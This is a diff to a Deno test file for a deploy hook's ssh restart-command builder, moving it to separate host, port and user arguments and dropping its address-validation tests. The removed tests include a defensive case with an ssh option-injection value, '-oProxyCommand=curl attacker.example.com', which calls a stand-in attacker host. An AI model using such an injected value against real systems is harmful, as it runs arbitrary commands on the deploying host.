@@ -1,17 +1,19 @@
 // Tests for stacks/traefik/after.deploy.ts's pure helper.
 // (No shell interaction — that runs via the deploy script.)
 //
-// parseSshAddress itself is covered by the shared-table agreement test
-// in cli/server-keys.test.ts (proves this hook's inlined copy agrees
-// with cli's parser on every case); these tests are about
-// buildRestartCommand's own argv shape.
+// buildRestartCommand takes the already-parsed SSH_HOST/SSH_PORT/SSH_USER
+// contract keys (#229) — parsing SSH_ADDRESS itself is cli/server-keys.ts's
+// job now, exercised by cli/deploy/hooks.test.ts and cli/server-keys.test.ts.
+// These tests are only about this hook's own argv shape.
 
-import { assertEquals, assertThrows } from "@std/assert"
+import { assertEquals } from "@std/assert"
 import { buildRestartCommand } from "./after.deploy.ts"
 
-Deno.test("buildRestartCommand: valid address — ConnectTimeout, BatchMode then '--' precedes the address", () => {
-  const args = buildRestartCommand("user@192.0.2.10", "hl-traefik")
+Deno.test("buildRestartCommand: -p, the standard options, then '--' then the target", () => {
+  const args = buildRestartCommand("192.0.2.10", "22", "user", "hl-traefik")
   assertEquals(args, [
+    "-p",
+    "22",
     "-o",
     "ConnectTimeout=10",
     "-o",
@@ -24,30 +26,15 @@ Deno.test("buildRestartCommand: valid address — ConnectTimeout, BatchMode then
   ])
 })
 
-Deno.test("buildRestartCommand: an ssh_config alias is accepted", () => {
-  const args = buildRestartCommand("home", "hl-traefik")
+Deno.test("buildRestartCommand: carries a non-default port", () => {
+  const args = buildRestartCommand("192.0.2.10", "2222", "user", "hl-traefik")
   assertEquals(args, [
-    "-o",
-    "ConnectTimeout=10",
-    "-o",
-    "BatchMode=yes",
-    "--",
-    "home",
-    "docker",
-    "restart",
-    "hl-traefik",
-  ])
-})
-
-Deno.test("buildRestartCommand: carries the port from SSH_ADDRESS as -p", () => {
-  const args = buildRestartCommand("user@192.0.2.10:2222", "hl-traefik")
-  assertEquals(args, [
-    "-o",
-    "ConnectTimeout=10",
-    "-o",
-    "BatchMode=yes",
     "-p",
     "2222",
+    "-o",
+    "ConnectTimeout=10",
+    "-o",
+    "BatchMode=yes",
     "--",
     "user@192.0.2.10",
     "docker",
@@ -56,85 +43,39 @@ Deno.test("buildRestartCommand: carries the port from SSH_ADDRESS as -p", () => 
   ])
 })
 
-Deno.test("buildRestartCommand: a bare IPv6 address is accepted with no port", () => {
-  const args = buildRestartCommand("2001:db8::1", "hl-traefik")
+Deno.test("buildRestartCommand: no user — bare host as the target", () => {
+  const args = buildRestartCommand("homelab", "22", undefined, "hl-traefik")
   assertEquals(args, [
+    "-p",
+    "22",
     "-o",
     "ConnectTimeout=10",
     "-o",
     "BatchMode=yes",
     "--",
-    "2001:db8::1",
+    "homelab",
     "docker",
     "restart",
     "hl-traefik",
   ])
 })
 
-Deno.test("buildRestartCommand: [IPv6]:port reaches ssh as a bare host + -p", () => {
-  const args = buildRestartCommand("[2001:db8::1]:2222", "hl-traefik")
+Deno.test("buildRestartCommand: a bare IPv6 host is never bracketed here", () => {
+  // ssh gets the host and -p <port> as separate argv slots, so the
+  // brackets that would disambiguate a combined "host:port" string
+  // aren't needed (or added) — see targetHost's comment in server-keys.ts.
+  const args = buildRestartCommand("2001:db8::1", "2222", undefined, "hl-traefik")
   assertEquals(args, [
-    "-o",
-    "ConnectTimeout=10",
-    "-o",
-    "BatchMode=yes",
     "-p",
     "2222",
+    "-o",
+    "ConnectTimeout=10",
+    "-o",
+    "BatchMode=yes",
     "--",
     "2001:db8::1",
     "docker",
     "restart",
     "hl-traefik",
   ])
-})
-
-Deno.test("buildRestartCommand: rejects an unbracketed IPv6 address followed by a port", () => {
-  assertThrows(
-    () => buildRestartCommand("2001:db8::1:2222", "hl-traefik"),
-    Error,
-    "invalid SSH_ADDRESS",
-  )
-})
-
-Deno.test("buildRestartCommand: rejects a value starting with '-'", () => {
-  // Without the "--" guard and this check, ssh would read this as an
-  // option: "-oProxyCommand=curl attacker.example.com" runs a local
-  // command as part of ssh's own option parsing, no shell involved.
-  assertThrows(
-    () => buildRestartCommand("-oProxyCommand=curl attacker.example.com", "hl-traefik"),
-    Error,
-    "invalid SSH_ADDRESS",
-  )
-})
-
-Deno.test("buildRestartCommand: rejects a bare '-flag'", () => {
-  assertThrows(
-    () => buildRestartCommand("--", "hl-traefik"),
-    Error,
-    "invalid SSH_ADDRESS",
-  )
-})
-
-Deno.test("buildRestartCommand: rejects a host starting with - even behind a user", () => {
-  assertThrows(
-    () => buildRestartCommand("user@-oProxyCommand", "hl-traefik"),
-    Error,
-    "invalid SSH_ADDRESS",
-  )
-})
-
-Deno.test("buildRestartCommand: rejects a value with a space", () => {
-  assertThrows(
-    () => buildRestartCommand("host with space", "hl-traefik"),
-    Error,
-    "invalid SSH_ADDRESS",
-  )
-})
-
-Deno.test("buildRestartCommand: rejects an empty string", () => {
-  assertThrows(
-    () => buildRestartCommand("", "hl-traefik"),
-    Error,
-    "invalid SSH_ADDRESS",
-  )
 })
